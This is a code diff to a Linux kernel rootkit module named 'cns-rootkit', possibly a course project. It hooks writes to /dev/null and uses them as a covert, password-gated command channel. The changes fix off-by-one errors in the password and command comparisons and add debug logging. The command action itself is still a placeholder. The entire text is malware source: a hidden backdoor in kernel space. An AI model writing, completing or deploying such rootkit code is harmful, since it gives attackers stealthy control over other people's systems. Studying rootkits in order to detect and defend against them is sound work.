@@ -97,13 +97,21 @@ struct file_operations *get_fops(char *path) {
 }
 
 void command_execute(char __user *buf, size_t count) {
-  if(count <= sizeof(PASSWORD) || strncmp(buf, PASSWORD, sizeof(PASSWORD)) != 0) return;
+  if(count <= sizeof(PASSWORD)) {
+    printk(KERN_INFO "cns-rootkit: Command is too small %lu\n", sizeof(PASSWORD));
+    return;
+  } 
+  
+  if(strncmp(buf, PASSWORD, sizeof(PASSWORD) - 1) != 0) { 
+    printk(KERN_INFO "cns-rootkit: Password failed %d\n", strncmp(buf, PASSWORD, sizeof(PASSWORD)));
+    return;
+  }
 
   printk(KERN_INFO "cns-rootkit: command password passed\n");
 
-  buf += sizeof(PASSWORD);
+  buf += (sizeof(PASSWORD) - 1);
 
-  if(strncmp(buf, CMD1, sizeof(CMD1)) == 0) {
+  if(strncmp(buf, CMD1, sizeof(CMD1) - 1) == 0) {
     printk(KERN_INFO "cns-rootkit: got command1\n");
     // call some function here
   } else {
@@ -112,7 +120,7 @@ void command_execute(char __user *buf, size_t count) {
 }
 
 ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
-  printk(KERN_INFO "cns-rootkit: In my /dev/null\n", buf);
+  printk(KERN_INFO "cns-rootkit: In my /dev/null hook with length %lu\n", count);
   command_execute(buf, count);
   ssize_t (*original_dev_null_write) (struct file *filep, char __user *buf, size_t count, loff_t *p);
   original_dev_null_write = hook_unpatch((void *) cns_rootkit_dev_null_write);
